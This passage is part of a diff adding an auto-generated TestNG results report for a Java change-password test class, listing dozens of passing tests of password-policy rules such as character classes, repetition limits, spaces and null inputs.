+        <test-method status="PASS" signature="newPasswordWithAllowedSpecialCharacterRepeatedEqualToFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithAllowedSpecialCharacterRepeatedEqualToFourTimes" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password with allowed special character Repeated =4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithAllowedSpecialCharacterRepeatedEqualToFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithAllowedSpecialCharacterRepeatedEqualToFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithAllowedSpecialCharacterRepeatedGreaterThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithAllowedSpecialCharacterRepeatedGreaterThanFourTimes" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password with allowed special character Repeated &gt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithAllowedSpecialCharacterRepeatedGreaterThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithAllowedSpecialCharacterRepeatedGreaterThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithAllowedSpecialCharacterRepeatedLessThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithAllowedSpecialCharacterRepeatedLessThanFourTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with allowed special character Repeated &lt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithAllowedSpecialCharacterRepeatedLessThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithAllowedSpecialCharacterRepeatedLessThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithAllowedSpecialCharactersEqualToFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithAllowedSpecialCharactersEqualToFourTimes" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password with allowed special characters =4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithAllowedSpecialCharactersEqualToFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithAllowedSpecialCharactersEqualToFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithAllowedSpecialCharactersGreaterThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithAllowedSpecialCharactersGreaterThanFourTimes" duration-ms="9" started-at="2020-02-23T12:55:51 IST" description="New password with allowed special characters &gt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithAllowedSpecialCharactersGreaterThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithAllowedSpecialCharactersGreaterThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithAllowedSpecialCharactersLessThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithAllowedSpecialCharactersLessThanFourTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with allowed special characters &lt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithAllowedSpecialCharactersLessThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithAllowedSpecialCharactersLessThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithDigitRepeatedEqualToFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithDigitRepeatedEqualToFourTimes" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password with digit Repeated =4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithDigitRepeatedEqualToFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithDigitRepeatedEqualToFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithDigitRepeatedGreaterThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithDigitRepeatedGreaterThanFourTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with digit Repeated &gt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithDigitRepeatedGreaterThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithDigitRepeatedGreaterThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithDigitRepeatedLessThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithDigitRepeatedLessThanFourTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with digit Repeated &lt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithDigitRepeatedLessThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithDigitRepeatedLessThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithDigitsEqualToFiftyPercentTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithDigitsEqualToFiftyPercentTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with digits =50% times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithDigitsEqualToFiftyPercentTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithDigitsEqualToFiftyPercentTimes -->
+        <test-method status="PASS" signature="newPasswordWithDigitsGreaterThanFiftyPercentTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithDigitsGreaterThanFiftyPercentTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with digits &gt;50% times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithDigitsGreaterThanFiftyPercentTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithDigitsGreaterThanFiftyPercentTimes -->
+        <test-method status="PASS" signature="newPasswordWithDigitsLessThanFiftyPercentTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithDigitsLessThanFiftyPercentTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with digits &lt;50% times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithDigitsLessThanFiftyPercentTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithDigitsLessThanFiftyPercentTimes -->
+        <test-method status="PASS" signature="newPasswordWithLowerCaseRepeatedEqualToFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithLowerCaseRepeatedEqualToFourTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with lower case characters Repeated =4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithLowerCaseRepeatedEqualToFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithLowerCaseRepeatedEqualToFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithLowerCaseRepeatedGreaterThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithLowerCaseRepeatedGreaterThanFourTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with lower case characters Repeated &gt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithLowerCaseRepeatedGreaterThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithLowerCaseRepeatedGreaterThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithLowerCaseRepeatedLessThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithLowerCaseRepeatedLessThanFourTimes" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password with lower case characters Repeated &lt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithLowerCaseRepeatedLessThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithLowerCaseRepeatedLessThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithOnlyAllowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyAllowedSpecialCharacters" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with only allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyAllowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyAllowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyDigit(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyDigit" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only digit" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyDigit(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyDigit -->
+        <test-method status="PASS" signature="newPasswordWithOnlyDigitAndAllowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyDigitAndAllowedSpecialCharacters" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only digit and allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyDigitAndAllowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyDigitAndAllowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyLowerCaseCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyLowerCaseCharacters" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with only lower case characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyLowerCaseCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyLowerCaseCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyLowerCaseCharactersAndAllowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyLowerCaseCharactersAndAllowedSpecialCharacters" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with only lower case characters and Allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyLowerCaseCharactersAndAllowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyLowerCaseCharactersAndAllowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyLowerCaseCharactersAndDigits(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyLowerCaseCharactersAndDigits" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with only lower case characters and digits" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyLowerCaseCharactersAndDigits(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyLowerCaseCharactersAndDigits -->
+        <test-method status="PASS" signature="newPasswordWithOnlyLowerCaseCharactersDigitsAndAllowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyLowerCaseCharactersDigitsAndAllowedSpecialCharacters" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only lower case characters, digits and allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyLowerCaseCharactersDigitsAndAllowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyLowerCaseCharactersDigitsAndAllowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyUnallowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyUnallowedSpecialCharacters" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only un allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyUnallowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyUnallowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyUpperAndLowerCaseCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyUpperAndLowerCaseCharacters" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with only upper case characters and lower case characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyUpperAndLowerCaseCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyUpperAndLowerCaseCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyUpperCaseCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyUpperCaseCharacters" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only upper case characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyUpperCaseCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyUpperCaseCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyUpperCaseCharactersAndAllowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyUpperCaseCharactersAndAllowedSpecialCharacters" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only upper case characters and Allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyUpperCaseCharactersAndAllowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyUpperCaseCharactersAndAllowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyUpperCaseCharactersAndDigits(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyUpperCaseCharactersAndDigits" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only upper case characters and digits" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyUpperCaseCharactersAndDigits(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyUpperCaseCharactersAndDigits -->
+        <test-method status="PASS" signature="newPasswordWithOnlyUpperCaseCharactersDigitsAndAllowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyUpperCaseCharactersDigitsAndAllowedSpecialCharacters" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with only upper case characters, digits and allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyUpperCaseCharactersDigitsAndAllowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyUpperCaseCharactersDigitsAndAllowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithOnlyUpperCaseLowerCaseCharactersAndDigits(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithOnlyUpperCaseLowerCaseCharactersAndDigits" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with only upper case characters, lower case characters and Digits" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithOnlyUpperCaseLowerCaseCharactersAndDigits(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithOnlyUpperCaseLowerCaseCharactersAndDigits -->
+        <test-method status="PASS" signature="newPasswordWithUpperCaseLowerCaseCharactersDigitsAndAllowedSpecialCharacters(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithUpperCaseLowerCaseCharactersDigitsAndAllowedSpecialCharacters" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with upper case characters, lower case characters, Digits and allowed special characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithUpperCaseLowerCaseCharactersDigitsAndAllowedSpecialCharacters(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithUpperCaseLowerCaseCharactersDigitsAndAllowedSpecialCharacters -->
+        <test-method status="PASS" signature="newPasswordWithUpperCaseRepeatedEqualToFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithUpperCaseRepeatedEqualToFourTimes" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with upper case characters Repeated =4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithUpperCaseRepeatedEqualToFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithUpperCaseRepeatedEqualToFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithUpperCaseRepeatedGreaterThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithUpperCaseRepeatedGreaterThanFourTimes" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with upper case characters Repeated &gt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithUpperCaseRepeatedGreaterThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithUpperCaseRepeatedGreaterThanFourTimes -->
+        <test-method status="PASS" signature="newPasswordWithUpperCaseRepeatedLessThanFourTimes(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordWithUpperCaseRepeatedLessThanFourTimes" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with upper case characters Repeated &lt;4 times" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordWithUpperCaseRepeatedLessThanFourTimes(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordWithUpperCaseRepeatedLessThanFourTimes -->
+        <test-method status="PASS" signature="nullAsNewPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="nullAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="null sent as new password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.nullAsNewPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- nullAsNewPassword -->
+        <test-method status="PASS" signature="oldPasswordDoesntMatchWithSystem(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="oldPasswordDoesntMatchWithSystem" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Old Password doesn&#039;t match with System" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.oldPasswordDoesntMatchWithSystem(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- oldPasswordDoesntMatchWithSystem -->
+        <test-method status="PASS" signature="oldPasswordEmpty(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="oldPasswordEmpty" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Old Password empty" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.oldPasswordEmpty(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- oldPasswordEmpty -->
+        <test-method status="PASS" signature="oldPasswordnull(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="oldPasswordnull" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Old Password null" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.oldPasswordnull(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- oldPasswordnull -->
+        <test-method status="PASS" signature="onlySpacesInNewPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="onlySpacesInNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="only spaces in new password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.onlySpacesInNewPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- onlySpacesInNewPassword -->
+        <test-method status="PASS" signature="spacesInBetweenNewPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="spacesInBetweenNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Spaces in between new password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.spacesInBetweenNewPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- spacesInBetweenNewPassword -->
+        <test-method status="PASS" signature="trailingSpacesInNewPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="trailingSpacesInNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Trailing spaces in new password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.trailingSpacesInNewPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- trailingSpacesInNewPassword -->
+        <test-method status="PASS" signature="validNewPasswordReverseOfCorrectOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="validNewPasswordReverseOfCorrectOldPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Valid new password which is Reverse of correct Old password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.validNewPasswordReverseOfCorrectOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- validNewPasswordReverseOfCorrectOldPassword -->
+        <test-method status="PASS" signature="validNewPasswordStartsWithAllowedSpecialCharacter(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="validNewPasswordStartsWithAllowedSpecialCharacter" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Valid new password starts with an allowed special character" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.validNewPasswordStartsWithAllowedSpecialCharacter(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- validNewPasswordStartsWithAllowedSpecialCharacter -->
+        <test-method status="PASS" signature="validNewPasswordStartsWithDigit(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="validNewPasswordStartsWithDigit" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Valid new password starts with a digit" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.validNewPasswordStartsWithDigit(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- validNewPasswordStartsWithDigit -->
+        <test-method status="PASS" signature="validNewPasswordStartsWithLowerCase(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="validNewPasswordStartsWithLowerCase" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="Valid new password starts with a lower case character" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.validNewPasswordStartsWithLowerCase(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
